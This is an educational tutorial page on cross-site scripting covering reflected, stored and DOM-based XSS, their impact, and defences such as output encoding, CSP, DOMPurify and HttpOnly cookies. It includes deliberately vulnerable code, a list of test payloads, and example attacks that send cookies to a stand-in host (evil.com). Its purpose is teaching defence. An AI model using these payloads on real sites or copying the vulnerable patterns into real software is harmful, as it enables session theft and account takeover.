---
title: Cross-Site Scripting (XSS)
---

# Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. It's one of the most common web security flaws.

---

## How XSS Works

1. Attacker finds an input that gets rendered in the page without sanitization
2. Attacker injects a malicious script (usually JavaScript)
3. Victim's browser executes the script thinking it's part of the trusted site
4. The script can steal cookies, redirect users, or modify page content

---

## Types of XSS

| Type | Storage | Trigger | Severity |
|------|---------|---------|----------|
| **Reflected** | Not stored | User clicks a crafted link | Medium |
| **Stored** | Saved in database | Any user visits the page | High |
| **DOM-based** | Client-side only | User interaction | Medium-High |

---

## Reflected XSS

The malicious script comes from the current HTTP request (e.g., a URL parameter).

### Example:

Vulnerable server code:
```javascript
app.get("/search", (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Results for: ${query}</h1>`);
});
```

Attack URL:
```
https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

The server reflects the input directly into HTML — the browser executes the script.

---

## Stored XSS

The malicious script is permanently stored on the target server (database, forum post, comment).

### Example:

A comment form that saves input without sanitization:
```javascript
// Attacker submits this as a comment:
<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>
```

Every user who views the page with that comment has their cookies stolen.

### Why it's more dangerous:
- No crafted link needed — victims just browse the site
- Affects all users who see the content
- Persists until manually removed

---

## DOM-Based XSS

The vulnerability exists in client-side JavaScript, not the server response.

### Example:

```javascript
// Vulnerable client-side code
const name = document.location.hash.substring(1);
document.getElementById("greeting").innerHTML = "Hello, " + name;
```

Attack URL:
```
https://example.com/page#<img src=x onerror=alert(document.cookie)>
```

The server never sees the malicious payload — it lives entirely in the browser.

---

## Impact of XSS

| Impact | Description |
|--------|-------------|
| **Session hijacking** | Steal session cookies to impersonate users |
| **Credential theft** | Inject fake login forms to capture passwords |
| **Keylogging** | Record everything the user types |
| **Defacement** | Modify page content to display false information |
| **Malware distribution** | Redirect to malicious downloads |
| **Crypto mining** | Use victim's browser to mine cryptocurrency |
| **Worm propagation** | Self-spreading XSS (like the Samy worm) |

---

## Prevention Techniques

### 1. Output Encoding

Encode data before inserting into HTML:

```javascript
// WRONG — direct insertion
element.innerHTML = userInput;

// RIGHT — encode HTML entities
function escapeHtml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
element.innerHTML = escapeHtml(userInput);

// BEST — use textContent (auto-escapes)
element.textContent = userInput;
```

### 2. Content Security Policy (CSP)

A response header that restricts what scripts can execute:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'
```

| CSP Directive | Purpose |
|---------------|---------|
| `default-src 'self'` | Only load resources from same origin |
| `script-src 'self'` | Only allow scripts from same origin |
| `script-src 'nonce-abc123'` | Allow only scripts with matching nonce |
| `style-src 'self'` | Only allow styles from same origin |
| `img-src *` | Allow images from any origin |

### 3. Input Sanitization

Use well-tested libraries to strip dangerous HTML:

```javascript
// Using DOMPurify (recommended)
import DOMPurify from "dompurify";
const clean = DOMPurify.sanitize(userInput);

// Allows safe HTML tags, removes scripts
```

### 4. Framework Protections

Modern frameworks auto-escape by default:

```jsx
// React — auto-escapes (safe)
<div>{userInput}</div>

// React — dangerous, bypasses escaping
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

### 5. HTTPOnly Cookies

Prevent JavaScript from accessing session cookies:

```javascript
res.cookie("session", token, {
  httpOnly: true,  // Cannot be accessed by document.cookie
  secure: true,    // Only sent over HTTPS
  sameSite: "Strict"
});
```

---

## XSS Testing Payloads

Common payloads used in security testing:

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
javascript:alert('XSS')
<body onload=alert('XSS')>
```

> **Note:** Only test on systems you have permission to test.

---

## Defense in Depth Summary

| Layer | Technique |
|-------|-----------|
| **Input** | Validate and sanitize user input |
| **Output** | Encode data based on context (HTML, JS, URL) |
| **Browser** | Set CSP headers to restrict script execution |
| **Cookies** | Use HttpOnly and Secure flags |
| **Framework** | Use auto-escaping template engines |

---

## Key Takeaways

- XSS lets attackers run scripts in other users' browsers
- **Reflected** XSS requires a crafted link; **Stored** XSS affects all visitors
- **DOM-based** XSS happens entirely client-side
- Always encode output and never trust user input
- Use **CSP headers** as a second line of defense
- Modern frameworks auto-escape — avoid bypassing that protection
- Use **HttpOnly** cookies to protect sessions even if XSS occurs

---

Next, we'll learn about **Cross-Site Request Forgery (CSRF)** →
